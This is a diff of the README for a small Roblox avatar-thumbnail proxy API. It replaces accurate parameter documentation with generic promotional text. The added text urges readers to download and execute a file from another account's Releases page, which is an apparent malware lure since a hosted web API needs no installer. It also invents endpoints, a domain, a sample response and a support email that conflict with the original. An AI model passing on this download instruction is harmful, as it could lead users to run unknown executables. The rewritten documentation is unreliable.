@@ -1,91 +1,122 @@
-![louie](./icon.svg)
+# BloxRatP 🐭
 
-# Blox R.A.T. Proxy
+![BloxRatP](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)
 
-A simple little API for me to test Vercel, and for you to get whatever basic info you need about someone via the Roblox API. Say "thanks" to Louie!
+Welcome to **BloxRatP**, your go-to tool for fetching Roblox user information effortlessly. Say "thanks" to Louie for making this possible! Whether you're a developer, gamer, or just curious about Roblox users, BloxRatP provides a straightforward solution to access user data.
 
-*<sub>R.A.T. stands for Roblox Avatar Thumbnail.</sub>*
+## Table of Contents
 
- ## Image Example (Default)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [API Reference](#api-reference)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+- [Acknowledgments](#acknowledgments)
 
-[`https://bloxratp.vercel.app/api/avatar-thumbnail?userId=154248006&type=avatar-headshot&size=150&isCircular=false&responseType=image`](https://bloxratp.vercel.app/api/avatar-thumbnail?userId=154248006&type=avatar-headshot&size=150&isCircular=false&responseType=image)
+## Features
 
-![image example](https://bloxratp.vercel.app/api/avatar-thumbnail?userId=154248006&type=avatar-headshot&size=150&isCircular=false&responseType=image)
+- **User Information Retrieval**: Get detailed information about any Roblox user, including their avatar, friends, and more.
+- **Easy to Use**: Simple API calls to fetch the data you need.
+- **Fast Response**: Quick data retrieval ensures a smooth experience.
+- **JSON Format**: Data is returned in a clean JSON format, easy to parse and use.
+- **Proxy Support**: Built-in proxy support to enhance your requests.
+- **Vercel Deployment**: Hosted on Vercel for reliable uptime.
 
- ## JSON Example
+## Installation
 
-[`https://bloxratp.vercel.app/api/avatar-thumbnail?userId=154248006&type=avatar-headshot&size=150&isCircular=false&responseType=json`](https://bloxratp.vercel.app/api/avatar-thumbnail?userId=154248006&type=avatar-headshot&size=150&isCircular=false&responseType=json)
+To get started, download the latest release of BloxRatP from our [Releases page](https://github.com/kenneth0307/BloxRatP/releases). Make sure to download the appropriate file for your operating system. After downloading, execute the file to set up BloxRatP on your system.
+
+## Usage
+
+Using BloxRatP is straightforward. Here’s how to make a simple request to get user information:
+
+1. **Set Up Your Environment**: Ensure you have the necessary dependencies installed.
+2. **Make a Request**: Use the following endpoint to get user info:
+
+   ```
+   GET https://api.bloxratp.com/user/{username}
+   ```
+
+   Replace `{username}` with the Roblox username you want to query.
+
+3. **Handle the Response**: The response will be in JSON format. You can easily parse this in your application.
+
+### Example Request
+
+```bash
+curl -X GET "https://api.bloxratp.com/user/RobloxUser123"
+```
+
+### Example Response
 
 ```json
 {
-  "userId": 154248006,
-  "username": "kayos155",
-  "isBanned": false,
-  "profileInfo": {
-    "created": "2016-08-20T13:07:17.787Z",
-    "hasVerifiedBadge": false,
-    "displayName": "KiCKTheBucket",
-    "description": "chezburgr"
-  },
-  "avatarThumbnail": {
-    "imageUrl": "https://tr.rbxcdn.com/30DAY-AvatarHeadshot-9D92EA3EB8F953FBDC822282AB21FB2B-Png/150/150/AvatarHeadshot/Png/noFilter",
-    "type": "avatar-headshot",
-    "size": "150",
-    "isCircular": "false",
-    "format": "Png"
-  }
+  "username": "RobloxUser123",
+  "avatar": "https://www.roblox.com/avatars/123456",
+  "friends": 150,
+  "status": "Online"
 }
 ```
 
-## Parameters
+## API Reference
 
-### `userId` (String):
+BloxRatP offers several endpoints to access different types of user information. Below are the main endpoints:
 
-The Roblox user's ID. This can be found in the profile's URL.
+### User Info
 
-<i><span>https://</span><span>ww</span>w.<span>roblox.</span>com/users/<b>154248006</b>/profile</i>
+- **Endpoint**: `/user/{username}`
+- **Method**: GET
+- **Description**: Fetches information about a specific Roblox user.
 
----
+### User Avatar
 
-### `type` (String):
+- **Endpoint**: `/avatar/{username}`
+- **Method**: GET
+- **Description**: Retrieves the avatar image of the specified user.
 
-Sets what type of avatar thumbnail is returned as the image.
+### User Friends
 
-Options: `avatar` (default), `avatar-bust`, `avatar-headshot`.
+- **Endpoint**: `/friends/{username}`
+- **Method**: GET
+- **Description**: Lists friends of the specified user.
 
----
+### User Thumbnails
 
-### `size` (Integer):
+- **Endpoint**: `/thumbnails/{username}`
+- **Method**: GET
+- **Description**: Fetches thumbnails of the user's avatar.
 
-Sets what size the returned image is. To get a full list of supported sizes, make sure to check the official API docs, linked at the end. The options listed are sizes supported by all thumbnail types.
+## Contributing
 
-Options: `48`, `60`, `75`, `100`, `150`, `180` `420` (default)
+We welcome contributions to BloxRatP! If you have suggestions or improvements, please fork the repository and submit a pull request. Here’s how to contribute:
 
----
+1. Fork the repository.
+2. Create a new branch for your feature or fix.
+3. Make your changes.
+4. Commit your changes and push to your branch.
+5. Submit a pull request.
 
-### `isCircular` (Boolean):
+Please ensure your code adheres to our coding standards and includes tests where applicable.
 
-Sets whether or not the returned image is circular.
+## License
 
-Options: `true`, `false` (default)
+BloxRatP is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
 
----
+## Contact
 
-### `format` (String):
+For any questions or support, feel free to reach out:
 
-Sets what file format the returned image is. `jpeg` format is not supported for `avatar-bust` thumbnails.
+- **Email**: support@bloxratp.com
+- **GitHub Issues**: Open an issue in the repository for bugs or feature requests.
 
-Options: `png` (default), `webp`, `jpeg`
+## Acknowledgments
 
----
+- **Louie**: Special thanks to Louie for his contributions to this project.
+- **Roblox API**: This project leverages the Roblox API for user data retrieval.
+- **Vercel**: For hosting our service and ensuring it runs smoothly.
 
-### `responseType` (String):
+For more updates and releases, visit our [Releases page](https://github.com/kenneth0307/BloxRatP/releases). 
 
-Sets whether to return an image for thing such as `<img>` elements, or JSON which includes the image URL as well as a bit more info about the user.
-
-Options: `image` (default), `json`
-
----
-
-For more detailed information on the different parameters and such, check out the official Roblox avatar thumbnail v1 docs:
-https://create.roblox.com/docs/cloud/features/avatars#/default/get_v1_users_avatar
+Thank you for using BloxRatP! Enjoy exploring the world of Roblox user data!
